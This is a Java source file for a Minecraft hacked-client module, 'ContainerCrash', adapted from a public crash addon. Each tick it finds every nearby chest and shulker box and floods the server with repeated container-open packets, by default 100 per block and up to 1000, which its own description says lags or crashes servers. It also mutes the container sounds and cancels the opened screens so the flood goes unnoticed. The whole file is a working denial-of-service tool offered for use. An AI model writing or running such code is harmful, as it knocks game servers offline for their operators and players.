package kult.legacy.klient.systems.modules.crash;

import kult.legacy.klient.eventbus.EventHandler;
import kult.legacy.klient.events.game.GameLeftEvent;
import kult.legacy.klient.events.game.OpenScreenEvent;
import kult.legacy.klient.events.world.PlaySoundEvent;
import kult.legacy.klient.events.world.TickEvent;
import kult.legacy.klient.settings.BoolSetting;
import kult.legacy.klient.settings.IntSetting;
import kult.legacy.klient.settings.Setting;
import kult.legacy.klient.settings.SettingGroup;
import kult.legacy.klient.systems.modules.Categories;
import kult.legacy.klient.systems.modules.Module;
import kult.legacy.klient.utils.world.BlockIterator;
import net.minecraft.block.AbstractChestBlock;
import net.minecraft.block.Block;
import net.minecraft.block.ShulkerBoxBlock;
import net.minecraft.client.gui.screen.ingame.AbstractInventoryScreen;
import net.minecraft.client.gui.screen.ingame.HandledScreen;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import org.lwjgl.glfw.GLFW;

/*/-----------------------------------------------------------------------------------------------------------------------------/*/
/*/ Used from Meteor Crash Addon by Wide Cat                                                                                    /*/
/*/ https://github.com/Wide-Cat/meteor-crash-addon/blob/main/src/main/java/widecat/meteorcrashaddon/modules/ContainerCrash.java /*/
/*/-----------------------------------------------------------------------------------------------------------------------------/*/

public class ContainerCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per container block per tick.")
        .defaultValue(100)
        .min(1)
        .sliderRange(1, 1000)
        .build()
    );

    private final Setting<Boolean> noSound = sgGeneral.add(new BoolSetting.Builder()
        .name("no-sound")
        .description("Blocks the noisy container opening/closing sounds.")
        .defaultValue(false)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables the module on kick/leave.")
        .defaultValue(true)
        .build()
    );

    public ContainerCrash() {
        super(Categories.Crash, Items.CHEST, "container-crash", "Lags/crashes servers by spamming container opening packets. Press escape to toggle.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (GLFW.glfwGetKey(mc.getWindow().getHandle(), GLFW.GLFW_KEY_ESCAPE) == GLFW.GLFW_PRESS) {
            toggle();
            mc.player.closeHandledScreen();
        }

        BlockIterator.register(4, 4, ((blockPos, blockState) -> {
            Block block = blockState.getBlock();
            if (block instanceof AbstractChestBlock || block instanceof ShulkerBoxBlock) {

                BlockHitResult bhr = new BlockHitResult(new Vec3d(blockPos.getX(), blockPos.getY(), blockPos.getZ()), Direction.DOWN, blockPos, false);
                PlayerInteractBlockC2SPacket openPacket = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr);

                for (int i = 0; i < amount.get(); i++) {
                    mc.getNetworkHandler().sendPacket(openPacket);
                }
            }
        }));
    }

    @EventHandler
    private void onScreenOpen(OpenScreenEvent event) {
        if (event.screen == null) return;
        if (!event.screen.isPauseScreen() && !(event.screen instanceof AbstractInventoryScreen) && (event.screen instanceof HandledScreen)) event.setCancelled(true);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if (noSound.get() && shouldCancel(event)) event.cancel();
    }

    private boolean shouldCancel(PlaySoundEvent event) {
        return event.sound.getId().toString().equals("minecraft:block.chest.open") || event.sound.getId().toString().equals("minecraft:block.chest.close") || event.sound.getId().toString().equals("minecraft:block.shulker_box.open") || event.sound.getId().toString().equals("minecraft:block.shulker_box.close") || event.sound.getId().toString().equals("minecraft:block.ender_chest.open") || event.sound.getId().toString().equals("minecraft:block.ender_chest.close");
    }
}
